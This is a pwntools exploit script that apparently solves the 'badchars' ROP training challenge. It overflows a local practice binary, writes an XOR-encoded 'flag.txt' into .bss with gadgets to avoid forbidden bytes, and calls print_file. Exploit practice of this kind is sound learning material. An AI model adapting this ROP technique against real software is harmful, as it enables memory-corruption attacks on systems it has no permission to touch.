from pwn import *

p = process('./badchars')

junk = b'A'*40
str = b"dnce,vzv".ljust(8, b'\x00')
str_pack = p64(u64(str))
xor_key = p64(0x0202020202020202)

#bad chars: 78 61 67 2e or 'x' 'a' 'g' '.'

bss_addr = 0x00601038
print_file = p64(0x00400510) #plt addr

#gadgets
g1 = p64(0x004006a3) # pop rdi; ret;
g2 = p64(0x00400634) # mov qword ptr [r13], r12; ret;
g3 = p64(0x0040069c) # pop r12; pop r13; pop r14; pop r15; ret;
g4 = p64(0x00400628) # xor byte [r15], r14b
g5 = p64(0x004006a0) # pop r14 ; pop r15 ; ret

payload = junk + g3 + str_pack + p64(bss_addr) + p64(0x00) + p64(0x00) + g2 

for i in range(8):
    payload += g5
    payload += p64(xor_key[7-i])
    payload += p64(bss_addr + i)
    payload += g4

payload += g1
payload += p64(bss_addr)
payload += print_file

# gdb.attach(p, gdbscript="""
# b *0x400510  
# c
# """)

p.sendline(payload)
p.interactive()